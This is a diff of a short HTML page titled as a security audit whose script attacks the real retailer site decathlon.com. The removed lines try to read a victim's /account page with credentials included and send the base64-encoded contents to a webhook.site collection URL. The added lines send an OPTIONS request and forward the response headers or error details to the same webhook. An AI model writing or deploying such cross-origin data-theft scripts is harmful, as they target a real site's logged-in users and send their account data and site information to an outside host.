@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Security Audit in Progress...</h1>
+    <h1>Security Analysis...</h1>
     <script>
         var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
-
-        // محاولة قراءة بيانات الحساب عبر CORS
-        fetch('https://www.decathlon.com/account', {credentials: 'include'})
-        .then(response => response.text())
-        .then(data => {
-            // غانصيفطو أول 500 حرف من الصفحة (باش ما يوقعش بلوك للحجم)
-            var snippet = btoa(unescape(encodeURIComponent(data.substring(0, 500))));
-            window.location.href = webhook + "?html_leak=" + snippet;
+        
+        // محاولة بسيطة لقراءة الهيدرز فقط
+        fetch('https://www.decathlon.com/', { method: 'OPTIONS' })
+        .then(res => {
+            var headers = "";
+            res.headers.forEach((v, k) => { headers += k + ": " + v + " | "; });
+            window.location.href = webhook + "?headers=" + btoa(headers);
         })
         .catch(err => {
-            window.location.href = webhook + "?error=CORS_Blocked";
+            // إذا تبلوكا، غانصيفطو نوع الخطأ بالتفصيل
+            window.location.href = webhook + "?debug=" + btoa(err.message);
         });
     </script>
 </body>
